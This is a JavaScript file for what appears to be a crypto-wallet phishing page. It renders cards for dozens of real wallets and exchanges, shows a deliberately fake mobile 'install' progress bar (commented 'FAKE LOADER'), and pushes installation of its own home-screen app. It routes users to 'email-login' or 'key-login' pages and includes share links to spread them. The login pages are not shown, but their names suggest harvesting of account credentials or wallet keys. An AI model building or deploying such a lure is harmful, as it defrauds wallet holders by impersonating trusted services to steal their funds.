// ==========================
// MOBILE DETECTION
// ==========================
function isMobileDevice() {
  // True only for smartphones and tablets
  return (
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    ) && window.innerWidth <= 1024
  ); // extra safety for desktop emulation
}

// ==========================
// SERVICE WORKER REGISTER
// ==========================
if ("serviceWorker" in navigator) {
  window.addEventListener("load", () => {
    navigator.serviceWorker
      .register("./service-worker.js")
      .then(() => console.log("Service Worker Registered"))
      .catch((err) => console.log("SW error", err));
  });
}

console.log("Wallets page loaded!");

// ==========================
// EMAIL WALLET LIST
// ==========================
const emailWallets = [
  "Poloneix",
  "Coinbase1",
  "Coinbase2",
  "Binance",
  "Bitget",
  "Nash",
];

// ==========================
// ALL WALLETS
// ==========================
const wallets = [
  "Meta Mask",
  "Poloniex",
  "Trust Wallet",
  "Solflare",
  "WalletConnect",
  "Terra",
  "Bitpay",
  "Maiar",
  "MyKey",
  "Atwallet",
  "Authereum",
  "Bitfrost",
  "Coinbase1",
  "Coinomi",
  "Dcent",
  "Easypocket",
  "Ledger",
  "Coolwallet",
  "Cybavowallet",
  "Coin98",
  "Harmony",
  "PeakDefi",
  "Gridplus",
  "VIA",
  "Imtoken",
  "Infinito",
  "Infinity",
  "Kadachain",
  "Keplr",
  "Midas1",
  "Marixwallet",
  "Midas2",
  "Nash",
  "Onto",
  "Ownbit",
  "Pillar",
  "Rainbow",
  "Safepal",
  "Sollet",
  "Spark",
  "Spatium",
  "Tokenary",
  "Tokenpocket",
  "Tomo",
  "Torus",
  "Coinbase2",
  "XDC",
  "Walletio",
  "Walleth",
  "Zelcore",
  "Phantom",
  "Exodus",
  "Binance",
  "Bitget",
  "Other Wallets",
];

const container = document.getElementById("walletContainer");

// ==========================
// GENERATE WALLET CARDS
// ==========================
wallets.forEach((name) => {
  let imageName =
    name
      .toLowerCase()
      .replace(/\s+/g, "")
      .replace(/['./\-]/g, "") + ".webp";

  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card" onclick="openWallet('${name}')">
        <p>${name}</p>
        <div class="icon-row">
          <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
            <img src="assets/icons/downloads.png"><span>Install Wallet</span>
          </div>
          <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
            <img src="assets/icons/rocket.png"><span>Open Wallet</span>
          </div>
          <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
            <img src="assets/icons/share.png"><span>Share</span>
          </div>
        </div>
      </div>`;
    return;
  }

  container.innerHTML += `
    <div class="wallet-card" onclick="openWallet('${name}')">
      <img src="wallet-icons/${imageName}">
      <p>${name}</p>
      <div class="icon-row">
        <div class="icon-btn download-btn" onclick="event.stopPropagation(); installWallet('${name}')">
          <img src="assets/icons/downloads.png"><span>Install Wallet</span>
        </div>
        <div class="icon-btn rocket-btn" onclick="event.stopPropagation(); openWallet('${name}')">
          <img src="assets/icons/rocket.png"><span>Open Wallet</span>
        </div>
        <div class="icon-btn share-btn" onclick="event.stopPropagation(); shareWallet('${name}')">
          <img src="assets/icons/share.png"><span>Share</span>
        </div>
      </div>
    </div>`;
});

// ==========================
// INSTALL POPUP (FAKE LOADER) MOBILE ONLY
// ==========================
const popup = document.getElementById("installPopup");
const popLogo = document.getElementById("popLogo");
const popWalletName = document.getElementById("popWalletName");
const progressFill = document.getElementById("progressFill");
const successTick = document.getElementById("successTick");

function startInstallPopup(walletName) {
  if (!isMobileDevice()) {
    showDesktopOnlyPopup(); // 👈 desktop popup
    return;
  }

  popWalletName.innerText = walletName;
  popLogo.src = "icons/icon-192.png";

  progressFill.style.width = "0%";
  successTick.style.opacity = 0;
  popup.style.display = "flex";

  let progress = 0;
  const timer = setInterval(() => {
    progress += 2;
    progressFill.style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(timer);

      setTimeout(() => {
        successTick.style.opacity = 1;
        successTick.style.transform = "scale(1.4)";
      }, 300);

      setTimeout(() => {
        popup.style.display = "none";
        showA2HSPopup(walletName);
      }, 1500);
    }
  }, 80);
}

function installWallet(walletName) {
  startInstallPopup(walletName);
}

// ==========================
// OPEN WALLET
// ==========================
function openWallet(walletName) {
  const emailWallets = [
    "Coinbase1",
    "Coinbase2",
    "Binance",
    "Bitget",
    "Poloniex",
  ];
  if (emailWallets.includes(walletName)) {
    window.location.href = `email-login.html?wallet=${encodeURIComponent(
      walletName
    )}`;
  } else {
    window.location.href = `key-login.html?wallet=${encodeURIComponent(
      walletName
    )}`;
  }
}

// ==========================
// SHARE WALLET
// ==========================
function shareWallet(walletName) {
  const emailWallets = [
    "Coinbase1",
    "Coinbase2",
    "Binance",
    "Bitget",
    "Poloniex",
  ];
  const page = emailWallets.includes(walletName)
    ? "email-login.html"
    : "key-login.html";
  const shareUrl = `${
    window.location.origin
  }/${page}?wallet=${encodeURIComponent(walletName)}`;

  if (navigator.share) {
    navigator
      .share({
        title: "Wallet",
        text: `Check this wallet: ${walletName}`,
        url: shareUrl,
      })
      .catch(() => {});
  } else {
    alert("Sharing not supported.");
  }
}

// ==========================
// PWA ADD TO HOME SCREEN (MOBILE ONLY)
// ==========================
let deferredPrompt = null;

const a2hsPopup = document.getElementById("a2hsPopup");
const a2hsLogo = document.getElementById("a2hsLogo");
const a2hsName = document.getElementById("a2hsName");
const a2hsBtn = document.getElementById("a2hsBtn");

window.addEventListener("beforeinstallprompt", (e) => {
  if (!isMobileDevice()) return;

  e.preventDefault();
  deferredPrompt = e;
});

function showA2HSPopup(walletName) {
  if (!isMobileDevice()) return;
  if (!deferredPrompt) return;

  a2hsName.innerText = walletName;
  a2hsLogo.src = "icons/icon-192.png";
  a2hsPopup.style.display = "block";
}

a2hsBtn?.addEventListener("click", async () => {
  if (!isMobileDevice()) return;
  if (!deferredPrompt) return;

  deferredPrompt.prompt();
  await deferredPrompt.userChoice;
  deferredPrompt = null;
  a2hsPopup.style.display = "none";
});
function showDesktopOnlyPopup() {
  document.getElementById("desktopOnlyPopup").style.display = "flex";
}

function closeDesktopOnlyPopup() {
  document.getElementById("desktopOnlyPopup").style.display = "none";
}
